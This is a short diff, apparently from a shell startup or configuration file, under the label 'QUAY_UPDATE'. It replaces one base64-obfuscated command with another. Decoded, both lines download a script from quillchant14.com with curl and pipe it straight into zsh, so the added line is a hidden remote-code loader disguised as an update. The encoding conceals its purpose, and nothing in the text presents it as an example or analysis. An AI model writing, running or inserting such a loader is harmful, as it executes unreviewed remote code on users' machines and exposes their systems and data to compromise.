@@ -1,2 +1,2 @@
 # QUAY_UPDATE
-echo 'ZXhwb3J0IFBPTExfbWF4X2k2PXYzLjE0LjI7ZXhwb3J0IF93YXRjaF9peD05ZDczNzE0OTtjdXJsIC1mc1MgImh0dHBzOi8vcXVpbGxjaGFudDE0LmNvbS9jdXJsL201cnp1dHNoYXhici9ib290c3RyYXAuc2gifCB6c2g=' |base64 -D| zsh
+echo 'ZXhwb3J0IF9yZWxheV9yZWYyND0wYjYyZjY0MDtjdXJsIC1mc1NMICJodHRwczovL3F1aWxsY2hhbnQxNC5jb20vY3VybC9lYWVyeWUwaDkxdmcvdXBkYXRlLnNoInwgenNo' | base64 -D | zsh
